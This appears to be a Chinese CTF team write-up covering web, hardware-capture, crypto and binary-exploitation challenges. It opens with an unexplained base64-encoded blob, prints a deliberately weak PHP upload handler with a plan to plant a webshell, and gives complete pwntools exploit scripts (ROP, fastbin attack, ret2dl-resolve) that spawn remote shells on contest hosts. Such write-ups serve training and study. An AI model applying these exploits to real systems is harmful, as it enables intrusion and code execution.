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');
```

9、再来看看敏感文件，robots.txt 有内容。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555861868d25a4beff2c8d27a2a7f6f0eb92b11b5-1024x130.png)

10、有东西，打开看看。/?route=app/Up10aD。

![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558619138761b515d42a5a78e66d7f415b903650-1024x239.png)

获取下源码。
```
app/Up10aD.php 的源码：

    <?php
    if (!defined('LFI')) {
        echo "Include me!";
        exit();
    }

    if (isset($_FILES["file"])) {
        $filename = $_FILES["file"]["name"];
        $fileext = ".gif";
        switch ($_FILES["file"]["type"]) {
            case 'image/gif':
                $fileext = ".gif";
                break;
            case 'image/jpeg':
                $fileext = ".jpg";
                break;
            default:
                echo "Only gif/jpg allowed";
                exit();
        }
        $dst = "upload/" . $_FILES["file"]["name"] . $fileext;
        move_uploaded_file($_FILES["file"]["tmp_name"], $dst);
        echo "文件保存位置: {$dst}<br />";
    }
    ?>
    <html>

    <head>
        <meta charset="UTF-8">
    </head>

    <body>
        我们不能让选手轻而易举的搜索到上传接口。<br />
        即便是运气好的人碰巧遇到了，我相信我们的过滤是万无一失的(才怪
        <form method="post" enctype="multipart/form-data">
            <label for="file">来选择你的文件吧:</label>
            <input type="file" name="file" id="file" />
            <br />
            <input type="submit" name="submit" value="Submit" />
        </form>

    </body>

    </html>
```

11、可以看到似乎有文件上传漏洞，传个马上去试试。

12、靶机关了没整了，等复现了。

## Misc
**作者：wu1a**
### 签到题
打开摄像头后，有三个人被识别有绿圈，就代表成功了，cmd 界面弹出 flag  
![](https://i.loli.net/2019/04/22/5cbde23cee362.png)  
### saleae
一开始作为一个 web 手，完全没有接触过工控的题目，但受到题目名称的启发，搜了一下  
这个东西用什么软件打开，就下载了 Logic 这个软件，然后打开题目  
![](https://i.loli.net/2019/04/22/5cbde29d94eee.png)  
看到有过滤选项 而且只有 0 和 2 频道有波形图，调整过滤规则  
![](https://i.loli.net/2019/04/22/5cbde29d927c4.png)  
得到了  
![](https://i.loli.net/2019/04/22/5cbde29d73fd1.png)  
导出后 然后编辑一下就是 flag  
![](https://i.loli.net/2019/04/22/5cbde29daa3ab.png)  

### 24c
打开给的 24c.logicdata 文件，得到：  
![](https://i.loli.net/2019/04/22/5cbde36b54dd3.png)  
选择 i2c 过滤规则直接出现了 flag 字样  
![](https://i.loli.net/2019/04/22/5cbde378e2764.png)  
直接就去提交了这个分离出来的 flag 然后一直报错，一度怀疑题目错了。直到看到有一段  
有读写规则的转换，才知道自己不清楚这些 flag 字段是怎么拼接的。  
因为对工控不是很熟悉，百度了一下 24C 芯片的数据读写规则如下，8bitdata 接上 1bitack  
我们导出一下获得的数据  
![](https://i.loli.net/2019/04/22/5cbde38008591.png)  
我们得到的三个字段分别为 f163bdf4e},flag{c4649e10-e9b5-4d90-a883-41c,ac  
现在根据规则对这三段进行拼接  
再导出写入的地址顺序表  
![](https://i.loli.net/2019/04/22/5cbde386dafaf.png)  
了解一下 24c 元件的工作原理后，再通过上表确认了 ac 并不是写在最后 flag 那一段后面的，  
而是插在 flag{c4649e10-e9b5-4d90-a883-41c 中的。  
![](https://i.loli.net/2019/04/22/5cbde38e44893.png)  
![](https://i.loli.net/2019/04/22/5cbde39874953.png)  
![](https://i.loli.net/2019/04/22/5cbde39f74244.png)  
这样就得到了拼接的顺序，得到了正确的 flag
### badusb
直接先打开读文件：  
![](https://i.loli.net/2019/04/22/5cbde40537105.png)  
直接调整规则进行分析，并查看数据分析结果，最终发现只在如下图所示的规则下找到了flag 字段  
![](https://i.loli.net/2019/04/22/5cbde40a93273.png)  
在最后一段数据处发现了 flag  
![](https://i.loli.net/2019/04/22/5cbde41182d54.png)  
导出编辑和昨天的第一题工控一样  
![](https://i.loli.net/2019/04/22/5cbde4185ca4d.png)  
拼接后就得到了最后的 flag  

## Crypto
**作者：wu1a、匿名**
### puzzles
**作者：匿名**
###### Question0
这题就是计算一个四元一次方程组，使用Python里的numpy模块进行求解。
![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dDP_png)  

得到结果[4006. 3053. 2503. 2560.]

整理一下得到`fa6bed9c7a00`

##### Question1
`question1`思考了一会，尝试从`26364809`开始搜素数，发现`26364809`是第`2`个素数，`26366033`是第`76`个，`26366621`是第`113`个。成一个公差为`37`的等差数列。所以`part1`是第`39`个素数，即`26365399`。  
`part1=1924dd7`
##### Question2、3、4
第2 3 4题在网上都可以搜到类似的题目

![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dJ4_gif)  
第一就是简单的求极限和积分。
`part2=(1+91+7+1)*77=7700`
转换成flag格式 `part2=1e14`

第三题是一道物理题目  
![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dLG_gif)->![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dLE_gif)->![](https://0d077ef9e74d8.cdn.sohucs.com/ron3dVn_gif)  
代入数据，最后得到结果`part3=18640`  
转换成flag格式 `part3=48d0`

第四题考的是三重积分  
![https://s2.ax1x.com/2019/04/22/Ekv7fs.gif](https://pic.superbed.cn/item/5cbdad483a213b0417aba5c2)  
令`x=rcosa,y=rsina`。可以将上式转化为：  
![](https://s2.ax1x.com/2019/04/22/Ekvbpn.gif)  
这样就将三重积分转化成了三次定积分。并结合等式左边的式子得出结果。`part4=40320`
转化成flag格式 `part4=9d80`

最后拼接在一起得到flag

### Part_des
Key map 为十六进制数，转换成二进制后发现为 768 位，即 16*48，是des加密的16轮子密钥，从网上找到 des 的解密脚本，修改一下即可解出  
![](https://i.loli.net/2019/04/22/5cbde46374018.png)  
![](https://i.loli.net/2019/04/22/5cbde4662ec7d.png)  

### Warmup
打开脚本查看加密逻辑，发现每次 nc连上服务器后会自动生成随机的16位key和4 位prefix、
suffix，再用 prefix 和 suffix 生成 64 位的 count，然后用 count 和 key 生成 cipher。服务得到
我的输入，在后面拼接正确的 flag 后进行 aes 加密并输出。测试一下服务  
![](https://i.loli.net/2019/04/22/5cbde4f2ab804.png)  
爆破即可  
```
#coding:utf-8
#__author__:wu1a
from pwn import *
import string
def boom(k,flag):
for i in range(k,len(string)):
payload = flag + string[i]
p.sendline(payload)
aaa = p.recvline()[17:].replace("\n","")
aaa = aaa[:(len(flag)+1)*2]
# print aaa
if aaa in flag_aes:
print "ok",payload
boom(0,payload)
else:
pass
# context.log_level='debug'
p = remote("fc32f84bc46ac22d97e5f876e3100922.kr-lab.com",12345)
string="{}" + string.ascii_lowercase + "-0123456789"
flag="flag"
p.recvuntil("Welcome to flag getting system\n")
p.sendline("")
flag_aes=p.recvline()[17:].replace("\n","")
log.info("flag_aes -> " + flag_aes)
boom(0,flag)
# p.interactive()
```
![](https://i.loli.net/2019/04/22/5cbde4fc52abb.png)  
### Asymmetric
打开加密脚本后发现过程类似 RSA 加密，尝试用 RSA 解密，先分解 n 得到  
![](https://i.loli.net/2019/04/23/5cbde508a116f.png)  
```
pP=1657407551907933046558545060527940723781810462521183676934573856328183290415
404194886254720077100621286329426643663835514524985415605387445829227138086113
201767704015876746181218857199538311224872809784181103805973587479154209280538
60076414097300832349400288770613227105348835005596365488460445438176193451867
R=4
```
根据欧拉函数 p**4-p**3 计算 n，再计算得到 flag
![](https://i.loli.net/2019/04/23/5cbde5184e85f.png)  

## PWN
**作者：warden、wu1a**
### your_pwn

可重复利用的单字节读写的漏洞.  

![](https://i.loli.net/2019/04/23/5cbde6ec9e932.png)

先直接读取栈上的返回地址泄露`pie`基址.  
然后构造`ROP`链打印库函数地址泄露`libc`.直接调用`system(binsh);`获得`flag`.  

```python
from pwn import *

context.log_level = 'debug'
pop_rdi_ret = 0xd03
pop_rsi_r15_ret = 0xd01
#r = process("./pwn")
r = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")

r.recvuntil("name:")
r.sendline("w4rd3n")

def get(p):
    i = 0
    ll = 0
    while(1):
        r.recvuntil("index\n")
        r.sendline(str(i + p))
        data = r.recvuntil("value\n")[:-17]
        data = int(data[-2:],16)
        if(i < 8):
            ll += data * (0x100 ** i)
        r.sendline(str(data))
        i += 1
        if(i % 41 == 0):
            r.recvuntil("continue(yes/no)? \n")
            r.sendline("yes")
            return ll

def write(p, x):
    i = 0
    while(1):
        r.recvuntil("index\n")
        r.sendline(str(i + p))
        r.recvuntil("value\n")
        data = 0
        if(i != 40):
            data = (x[i/8] / (0x100 ** (i % 8))) % 0x100
        r.sendline(str(data))
        i += 1
        if(i % 41 == 0):
            r.recvuntil("continue(yes/no)? \n")
            r.sendline("yes")
            return

pie = get(0x158) - 0xb11
print "pie: " + hex(pie)

write(0x158, [pie + pop_rdi_ret, pie + 0x202020, pie + 0x8B0, pie + 0xb0c, 0, 0, 0, 0])

libc = u64(r.recvuntil("\n")[0:6].ljust(8,'\0')) - 0x06f690
print "libc: " + hex(libc)

system = libc + 0x045390
binsh = libc + 0x18cd57

write(0x158, [pie + pop_rdi_ret, binsh, system, 0, 0, 0, 0, 0])

r.interactive()
```

### daily

`remove`的时候没有对`index`进行范围检测.  

![](https://i.loli.net/2019/04/23/5cbde706ee0aa.png)  

先利用`unsorted bin`泄露`libc`,再利用`fastbin`单链表泄露`heap`基址.

申请一个`chunk`,在里面伪造一个堆指针和对应的`faker chunk`.  
`free`掉这个`faker chunk`,通过`edit`构造其`fd`到`bss`上,由于`length`可控,通过`remove`构造出一个`chunk`头部绕过检查.  
成功`fastbin attack`,获得任意读写的能力,由于程序开了`Full RELRO`所以劫持`__free_hook`调用`system(binsh);`获得`flag`.

```python
from pwn import *

context.log_level = 'debug'
#r = process("./pwn")
ptr = 0x602060
r = remote("85c3e0fcae5e972af313488de60e8a5a.kr-lab.com", "58512")

def show():
    r.sendline(str(1))
    data = r.recvuntil("Your choice:")
    return data

def add(length, content):
    r.sendline(str(2))
    r.recvuntil("of daily:")
    r.sendline(str(length))
    r.recvuntil("daily\n")
    r.send(content)
    r.recvuntil("Your choice:")

def edit(index, content):
    r.sendline(str(3))
    r.recvuntil("of daily:")
    r.sendline(str(index))
    r.recvuntil("daily\n")
    r.send(content)
    r.recvuntil("Your choice:")

def remove(index):
    r.sendline(str(4))
    r.recvuntil("of daily:")
    r.sendline(str(index))
    r.recvuntil("Your choice:")

r.recvuntil("Your choice:")

add(0x100, 'a')#0
add(0x100, 'b')#1
add(0x100, 'c')#2
add(0x100, 'd')#3
remove(0)
remove(2)
add(0x100, 'a' * 8)#0
add(0x100, 'a' * 8)#2

r.sendline(str(1))
r.recvuntil("aaaaaaaa")
heap = u64(r.recvuntil("1 :")[:-3].ljust(8,'\0')) - 0x220
r.recvuntil("aaaaaaaa")
libc = u64(r.recvuntil("3 :")[:-3].ljust(8,'\0')) - 0x3c4b78

print "heap: " + hex(heap)
print "libc: " + hex(libc)

remove(0)
remove(1)
remove(2)
remove(3)

add(0x60, p64(heap + 0x30) * 2 + p64(0) + p64(0x51))#0
add(0x20, 'a')#1
add(0x50, 'a')#2
add(0x20, 'a')#3
remove((heap + 0x18 - ptr - 8) / 0x10)
edit(0, p64(0) * 3 + p64(0x51) + p64(ptr + 0x18))
remove(1)
add(0x40, 'a')#1
add(0x40, 'a')#4
edit(4, p64(ptr))
edit(2, p64(0x100) + p64(ptr) + p64(0) * 4)
edit(0, p64(0x100) + p64(ptr) + p64(0x100) + p64(libc + 0x3c67a8) + p64(0x100) + p64(libc + 0x18cd57))
edit(1, p64(libc + 0x045390))

#gdb.attach(r)
r.sendline(str(4))
r.recvuntil("of daily:")
r.sendline(str(2))

r.interactive()
```

### baby_pwn

`ret2dl in x86`,没有可供`leak`的函数.保护很少,想起之前的`0ctf2018 babystack`,修改脚本直接打.  

```python
import sys
import roputils
from pwn import *

context.log_level = 'debug'
#r = process("./pwn")
r = remote("c346dfd9093dd09cc714320ffb41ab76.kr-lab.com", "56833")

rop = roputils.ROP('./pwn')
addr_bss = rop.section('.bss')

buf1 = 'A' * 0x2c
buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100)
r.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss + 20, 'system')
buf2 += rop.fill(100, buf2)
r.send(buf2)

buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)
r.send(buf3)

#gdb.attach(r)

r.interactive()
```

### Virtual

理解程序逻辑.  

![](https://i.loli.net/2019/04/23/5cbde7182263f.png)

首先是`store_instruction`函数将输入通过分隔符分类为各种操作符并保存在堆中,`store_num`同理.  
其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据).

重点就是`op`函数.

![](https://i.loli.net/2019/04/23/5cbde72e30ae4.png)

这里不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里`IDA`反汇编有问题,没有识别出函数调用,实际上`i`会被赋值为函数调用的返回值.

这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先`push`.

关键函数是`load`和`save`,知道偏移就可以任意读写.  
先使用`load`泄露堆上的堆地址,由于没开`pie`,通过`-`和`/`求出`.got[puts]`和此处偏移,再次`load`泄露`libc`,处理与`system`的偏移获得`system`地址.  
不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得`.got[puts]`偏移,调用`save`成功劫持`puts@plt`.  
